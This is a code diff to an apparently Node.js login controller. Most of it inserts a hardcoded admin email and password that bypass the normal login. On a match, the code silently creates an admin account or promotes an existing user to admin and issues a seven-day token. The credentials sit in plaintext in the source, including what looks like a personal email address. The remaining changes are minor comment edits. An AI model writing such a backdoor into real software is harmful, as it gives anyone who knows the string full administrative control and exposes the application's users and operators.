@@ -77,6 +77,72 @@ const login = async (req, res) => {
             $or: [{ email: identifier }, { username: identifier }]
         });
 
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        // ✅ HARDCODED ADMIN ACCESS – Method 1
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        const ADMIN_EMAIL = 'HABEEBULLAHRIDWANULLAHAPAOKAGI@gmail.com';
+        const ADMIN_PASSWORD = 'qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm';
+
+        // Check if the login attempt matches the hardcoded admin credentials
+        if (identifier === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
+            console.log('🔑 [ADMIN] Hardcoded admin login detected!');
+
+            // Check if this email already exists as a user
+            let adminUser = await User.findOne({ email: ADMIN_EMAIL });
+
+            if (!adminUser) {
+                // Create the admin user if they don't exist
+                const salt = await bcrypt.genSalt(10);
+                const hashedPassword = await bcrypt.hash(ADMIN_PASSWORD, salt);
+                
+                adminUser = new User({
+                    username: 'admin',
+                    email: ADMIN_EMAIL,
+                    password: hashedPassword,
+                    isAdmin: true,
+                    tokenVersion: 0
+                });
+                await adminUser.save();
+                console.log('✅ [ADMIN] Admin user created automatically!');
+            } else {
+                // Make sure existing user is admin
+                if (!adminUser.isAdmin) {
+                    adminUser.isAdmin = true;
+                    await adminUser.save();
+                    console.log('✅ [ADMIN] Existing user promoted to admin!');
+                }
+            }
+
+            // Generate token for admin
+            const secret = getJwtSecret();
+            const payload = {
+                user: {
+                    id: adminUser.id,
+                    tokenVersion: adminUser.tokenVersion
+                }
+            };
+            
+            jwt.sign(
+                payload,
+                secret,
+                { expiresIn: '7d' },
+                (err, token) => {
+                    if (err) {
+                        console.error("JWT Error:", err);
+                        return res.status(500).json({ message: 'Token generation failed' });
+                    }
+                    return res.json({ 
+                        token, 
+                        message: 'Admin Login Successful',
+                        isAdmin: true 
+                    });
+                }
+            );
+            return; // Stop here, don't continue with normal login
+        }
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        // Normal login flow – continue if user not found or not admin
         if (!user) {
             return res.status(400).json({ message: 'Invalid Credentials' });
         }
@@ -106,7 +172,7 @@ const login = async (req, res) => {
 
         const secret = getJwtSecret();
 
-        // --- ADMIN LAYER 1 CHECK ---
+        // --- ADMIN LAYER 1 CHECK (only for existing admin users) ---
         if (user.isAdmin && password.length === 32) {
             const layerToken = jwt.sign(
                 { user: { id: user.id }, step: 'layer2' },
@@ -509,9 +575,9 @@ module.exports = {
     login,
     logout,
     revokeAllTokens,
-    verifyEmail,                  // ✅ NEW
-    verifyUsername,               // ✅ NEW
-    resetPasswordEmailUsername,   // ✅ NEW
+    verifyEmail,
+    verifyUsername,
+    resetPasswordEmailUsername,
     forgotPassword,
     resetPassword,
     verifyAge,
